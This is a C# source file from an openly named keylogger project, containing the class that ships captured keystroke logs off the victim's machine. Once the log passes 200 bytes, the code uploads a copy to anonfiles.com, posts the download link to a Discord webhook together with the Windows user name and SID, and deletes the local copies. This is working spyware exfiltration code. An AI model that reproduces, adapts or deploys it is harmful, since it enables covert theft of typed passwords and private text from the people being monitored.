using System;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Security.Principal;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using RestSharp;

namespace Keystroke.API.Helpers
{
    public class LoggerUploader
    {
        public string DiscordUrlHook { get; set; }

        public LoggerUploader(string DiscordUrlHook)
        {
            this.DiscordUrlHook = DiscordUrlHook;
        }
        
        public void OnUserTyping(object sender, EventArgs e)
        {
            var logFile = LoggerSaver.LogginDirectory + LoggerSaver.LogginFile;
            // Will check if the size file is more than 200 bytes the file will be uploaded.
            if (new FileInfo(logFile).Length > 200)
            {
                UploadToAnon(logFile);
                //Then the file will be deleted and re-created again
                File.Delete(logFile);
            }
        }


        public void UploadToAnon(string path)
        {
            var copyOfLogs = path + new Random().GetHashCode()+".txt";
            File.Copy(path,copyOfLogs);
            
            
           RestClient restClient = new RestClient("https://api.anonfiles.com/upload");
           RestRequest restRequest = new RestRequest();

           restRequest.AddFile("file", copyOfLogs);
           
           Console.WriteLine(restClient.PostAsync(restRequest, (response, handle) =>
           {
               dynamic responseObject = JsonConvert.DeserializeObject(response.Content);
               var AnonUrl = responseObject["data"]["file"]["url"]["full"];
                ReportUploadedFileToDiscord(AnonUrl);
                File.Delete(copyOfLogs);
           }));
           
        }

        public void ReportUploadedFileToDiscord(dynamic url)
        {
            RestClient restClient = new RestClient(DiscordUrlHook);
            RestRequest restRequest = new RestRequest();
            
            var json = JsonConvert.SerializeObject(new
            {
                username = $"KeystrokeAPI -> KeyLogger -> Report",
                embeds = new[]
                {
                    new
                    {
                        description = $"KeystrokeAPI has new report!" +
                                      $"\n**Computer Name:** {WindowsIdentity.GetCurrent().Name}" +
                                      $"\n**DOWNLOAD URL:** ||{url}||" +
                                      $"\n**Hwid:** ||{WindowsIdentity.GetCurrent().User?.Value}||",
                        title = $"Keylogger report!",
                    }
                }
            });
            restRequest.AddParameter("application/json", json,ParameterType.RequestBody);

            Console.WriteLine(restClient.PostAsync(restRequest, (response, handle) =>
            {
                Console.WriteLine(response.Content);
            }));
        }


    }
}